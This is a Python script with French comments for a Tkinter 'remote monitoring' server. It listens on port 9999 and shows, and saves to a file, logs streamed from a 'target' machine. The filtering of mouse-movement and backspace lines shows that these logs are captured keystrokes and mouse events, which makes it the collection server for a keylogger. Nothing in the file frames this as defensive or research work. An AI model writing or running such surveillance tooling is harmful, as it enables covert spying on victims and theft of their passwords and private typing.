# monitoring_server.py - Lance sur ta machine pour recevoir les logs
import socket
import tkinter as tk
from tkinter import scrolledtext
import threading
import datetime
import os

# Config
HOST = ''  # Écoute sur toutes les interfaces (0.0.0.0)
PORT = 9999
DOSSIER_LOGS = os.path.join(os.path.expanduser("~"), "LogsDistants")
os.makedirs(DOSSIER_LOGS, exist_ok=True)
FICHIER_PROPRE = os.path.join(DOSSIER_LOGS, "journal_distant_propre.txt")

# Interface Tkinter
root = tk.Tk()
root.title("MONITORING DISTANT - Logs en live depuis la cible")
root.geometry("1200x800")
root.configure(bg="#000000")

tk.Label(root, text="LOGS DISTANTS EN TEMPS RÉEL", font=("Courier", 24, "bold"),
         fg="#ff0066", bg="#000000").pack(pady=15)

zone = scrolledtext.ScrolledText(root, font=("Consolas", 11), bg="#000000",
                                 fg="#00ffaa", insertbackground="#00ffaa")
zone.pack(fill="both", expand=True, padx=16, pady=10)

status = tk.Label(root, text="Attente de connexion...", fg="#00ffaa", bg="#000000", font=12)
status.pack(side="bottom", pady=12)

# Début session
debut = datetime.datetime.now()
zone.insert(tk.END, "╔" + "═"*100 + "╗\n")
zone.insert(tk.END, f"   SERVEUR MONITORING DÉMARRÉ → {debut:%Y-%m-%d %H:%M:%S}\n")
zone.insert(tk.END, f"   Port : {PORT} | Logs → {DOSSIER_LOGS}\n")
zone.insert(tk.END, "╚" + "═"*100 + "╝\n\n")
zone.see(tk.END)

# Écriture en-tête propre
with open(FICHIER_PROPRE, "a", encoding="utf-8") as f:
    f.write(f"\n\n═════ MONITORING DISTANT DÉMARRÉ ═════\n")
    f.write(f"Date : {debut:%d/%m/%Y à %H:%M:%S}\n")
    f.write("═══════════════════════════════════════════════\n\n")

def ecrire_propre(texte):
    with open(FICHIER_PROPRE, "a", encoding="utf-8") as f:
        f.write(texte + "\n")

def recevoir_logs(conn):
    while True:
        try:
            data = conn.recv(4096).decode('utf-8')
            if not data:
                break
            # Affichage live
            root.after(0, lambda d=data: zone.insert(tk.END, d))
            root.after(0, zone.see, tk.END)
            # Sauvegarde propre (filtrer le spam)
            lignes = data.split('\n')
            for ligne in lignes:
                if '[MOUSE →' in ligne and 'BACKSPACE' not in ligne:  # Skip mouvements spam
                    continue
                if ligne.strip():
                    ecrire_propre(ligne)
            status.config(text=f"Connexion active • {datetime.datetime.now():%H:%M:%S}")
        except:
            break
    conn.close()
    status.config(text="Connexion perdue... Redémarre le client sur la cible.")

def serveur():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    status.config(text=f"Serveur en écoute sur port {PORT}...")
    
    while True:
        conn, addr = s.accept()
        status.config(text=f"Connexion reçue de {addr[0]} !")
        threading.Thread(target=recevoir_logs, args=(conn,), daemon=True).start()

# Lancement serveur en thread
threading.Thread(target=serveur, daemon=True).start()

def on_close():
    fin = datetime.datetime.now()
    with open(FICHIER_PROPRE, "a", encoding="utf-8") as f:
        f.write(f"\nFin monitoring : {fin:%d/%m/%Y à %H:%M:%S}\n{'═'*50}\n\n")
    root.destroy()

root.protocol("WM_DELETE_WINDOW", on_close)
root.mainloop()
